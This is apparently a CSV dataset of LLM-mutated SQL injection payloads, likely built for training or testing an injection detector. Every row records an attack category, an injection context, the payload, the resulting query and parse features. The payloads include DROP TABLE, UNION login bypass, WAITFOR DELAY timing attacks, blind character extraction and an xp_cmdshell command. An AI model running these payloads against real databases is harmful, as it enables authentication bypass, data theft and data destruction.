attack_category,template_context,payload,full_query,label,source,generator_model,mutation_count,original_payload,failure_stage,is_valid_syntax,winning_context_index,winning_dialect,tables,columns,literal_types,select_arm_widths,node_set,Query
tautology,login,; -- DROP TABLE users;,SELECT * FROM users WHERE username = '; -- DROP TABLE users;' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,;--,sandbox,True,0,default,[],[],[],[],"[""Semicolon""]",; -- DROP TABLE users;
tautology,login,") UNION ALL SELECT 'admin', 'admin' --","SELECT * FROM users WHERE username = ') UNION ALL SELECT 'admin', 'admin' --' AND password = 'anything'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,) OR username='admin' AND password='admin',sandbox,True,7,default,"[""users""]",[],[],"[1, 2]","[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]",") UNION ALL SELECT 'admin', 'admin' --"
tautology,search,' OR 1=1; WAITFOR DELAY '0:0:5'; --,SELECT * FROM products WHERE name LIKE '%' OR 1=1; WAITFOR DELAY '0:0:5'; --%',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,";WAITFOR DELAY '0:0:5' AND (CHAR(1)+CHAR(0)+CHAR(0)+CHAR(1))=CHAR(1)+CHAR(0)+CHAR(0)+CHAR(1);--""",judge,False,-1,,[],[],[],[],[],' OR 1=1; WAITFOR DELAY '0:0:5'; --
tautology,user_lookup,AND 1=1,SELECT * FROM users WHERE id = AND 1=1,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,(SELECT 1),sandbox,True,1,default,"[""users""]",[],[],[],"[""And"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",AND 1=1
tautology,comment_insert,' OR (SELECT COUNT(*) FROM sysobjects WHERE type='U') > 0 --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT COUNT(*) FROM sysobjects WHERE type='U') > 0 --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,')) EXEC xp_cmdshell 'ping www.bing.com' --,judge,True,2,default,"[""users"", ""sysobjects""]","[""name"", ""type""]","[""TEXT"", ""INTEGER""]",[],"[""Column"", ""Count"", ""EQ"", ""From"", ""GT"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]",' OR (SELECT COUNT(*) FROM sysobjects WHERE type='U') > 0 --
union_based,login,) OR 1=1 --,SELECT * FROM users WHERE username = ') OR 1=1 --' AND password = 'anything',1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"') UNION SELECT username,password,1 FROM system_accounts /*",judge,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",) OR 1=1 --
union_based,user_lookup,)) OR 1=1; --,SELECT * FROM users WHERE id = )) OR 1=1; --,1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND EXISTS(SELECT 1 FROM employees WHERE id = 1 OR ABS(MOD(id, 1))) < 1 --",sandbox,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]",)) OR 1=1; --
union_based,user_lookup,"(IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1),1,0))--","SELECT * FROM users WHERE id = (IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1),1,0))--",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,' AND 0=(SELECT COUNT(*) FROM users),sandbox,True,0,default,"[""users""]","[""username"", ""id""]","[""INTEGER"", ""INTEGER""]",[],"[""Ascii"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Literal"", ""Paren"", ""Select"", ""Subquery"", ""Substring"", ""Table"", ""Where""]","(IF((SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1),1,0))--"
union_based,comment_insert,'; (SELECT id FROM posts WHERE user_id=1 LIMIT 1); --,"INSERT INTO comments (user_id, body) VALUES (1, ''; (SELECT id FROM posts WHERE user_id=1 LIMIT 1); --')",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,");
INSERT INTO comments (user_id, body) VALUES (1, (SELECT id FROM posts WHERE user_id=1 LIMIT 1));",sandbox,True,2,default,"[""users"", ""posts""]","[""name"", ""id"", ""user_id""]","[""TEXT"", ""INTEGER"", ""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Limit"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Subquery"", ""Table"", ""Where""]",'; (SELECT id FROM posts WHERE user_id=1 LIMIT 1); --
blind_boolean,search,"' OR CAST(SUBSTRING(username,1,1) AS CHAR)='a' --","SELECT * FROM products WHERE name LIKE '%' OR CAST(SUBSTRING(username,1,1) AS CHAR)='a' --%'",1,llm_mutated,Qwen/Qwen2.5-Coder-7B-Instruct,2,"' AND 1=CASE WHEN (SELECT SUBSTRING(CAST((SELECT ASCII(SUBSTRING(username, 1, 1)) AS VARCHAR(2)), 1, 1)=97) THEN 1 ELSE 0 END --",sandbox,True,2,default,"[""users""]","[""name"", ""username""]","[""TEXT"", ""TEXT""]",[],"[""Cast"", ""Column"", ""DataType"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Substring"", ""Table"", ""Where""]","' OR CAST(SUBSTRING(username,1,1) AS CHAR)='a' --"
